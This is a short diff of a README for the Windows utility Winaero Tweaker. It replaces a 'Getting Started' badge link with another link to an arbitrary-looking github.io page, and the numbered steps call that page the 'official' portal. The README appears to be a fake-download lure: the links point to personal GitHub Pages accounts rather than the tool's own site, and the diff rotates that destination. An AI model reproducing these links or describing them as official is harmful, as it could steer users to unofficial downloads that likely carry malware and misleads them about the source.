@@ -18,7 +18,7 @@ With **Winaero Tweaker**, you gain clarity, reduce clutter, and complete every s
 
 ## Getting Started
 
-[![Explore Winaero Tweaker](https://img.shields.io/badge/Explore-Winaero_Tweaker-green)](https://alkidatekel.github.io/.github/winaero-tweake)
+[![Explore Winaero Tweaker](https://img.shields.io/badge/Explore-Winaero_Tweaker-green)](https://gaddehfsfs.github.io/.github/winaero-tweake)
 
 1. Visit the official **Winaero Tweaker** portal.  
 2. Choose your preferred version (portable or setup-free).  
